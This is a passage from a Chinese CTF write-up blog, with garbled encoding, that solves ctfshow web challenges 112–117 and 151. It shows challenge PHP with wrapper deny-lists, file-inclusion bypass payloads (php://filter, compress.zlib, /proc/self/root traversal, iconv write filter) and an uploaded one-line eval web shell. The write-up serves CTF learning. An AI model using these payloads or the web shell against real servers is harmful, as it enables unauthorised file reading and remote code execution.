h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªåè®®æ„é€ </p><p><code>?file=php://filter/resource=flag.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221105162240491.png"></p><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:52</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?file=compress.zlib://flag.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221105210105260.png"></p><p>ç›®å½•æº¢å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:02:53</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨filter</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221105205020278.png"></p><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p>trimè¿‡æ»¤äº† 0a 09 0b æ²¡æœ‰è¿‡æ»¤0cï¼ˆæ¢é¡µé”®ï¼‰å¯ä»¥è¯•è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221106195150675.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221106194251720.png"></p><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>é¦™æ¸¯å°ç”µå½±</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221106200907595.png"></p><p>å‘ç°å›¾ç‰‡png,åˆ†ç¦»å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221106210225672.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/111.png"></p><p>æŠ“åŒ…è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221106210353345.png"></p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p><code>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></p><h2 id="æ–‡ä»¶ä¸Šä¼ ï¼ˆ151â€”170ï¼‰"><a href="#æ–‡ä»¶ä¸Šä¼ ï¼ˆ151â€”170ï¼‰" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ï¼ˆ151â€”170ï¼‰"></a>æ–‡ä»¶ä¸Šä¼ ï¼ˆ151â€”170ï¼‰</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬    <?php @eval($_POST[1]);?></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221026190308997.png"></p><p>ä¿®æ”¹åç¼€ï¼Œè¿æ¥èšå‰‘  ï¼Œæ³¨æ„è·¯å¾„</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025225038895.png"></p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> èŒæ–° </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
